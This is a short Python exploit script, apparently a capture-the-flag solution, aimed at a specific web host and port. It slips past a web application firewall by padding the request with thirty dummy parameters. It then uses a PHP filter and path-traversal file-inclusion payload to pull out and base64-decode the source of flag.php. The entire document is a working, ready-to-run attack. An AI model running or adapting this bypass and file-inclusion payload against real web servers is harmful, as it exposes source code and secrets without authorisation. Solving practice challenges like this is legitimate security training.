"""Exploit the param-count WAF bypass to dump flag.php source."""
import base64
import re
import urllib.parse
import urllib.request

dummies = "&".join(f"d{i}=1" for i in range(30))
qs = f"?{dummies}&category=" + urllib.parse.quote(
    "php://filter/convert.base64-encode/resource=woofers/../flag", safe="")
url = "http://noctf.fa1lsnow.com:40547/index.php" + qs
req = urllib.request.Request(url, headers={"User-Agent": "probe"})
with urllib.request.urlopen(req, timeout=10) as r:
    body = r.read().decode("utf-8", "replace")

print("status 200, body len", len(body))
m = re.search(r'<div class="page-include">(.*?)</div>', body, re.S)
inner = m.group(1) if m else body
b64 = re.sub(r"[^A-Za-z0-9+/=]", "", inner)
print("b64 blob len:", len(b64))

for pad in range(4):
    try:
        src = base64.b64decode(b64 + "=" * pad).decode("utf-8", "replace")
        print("===== DECODED SOURCE ======")
        print(src)
        break
    except Exception as e:  # noqa: BLE001
        print("decode attempt", pad, "failed:", e)
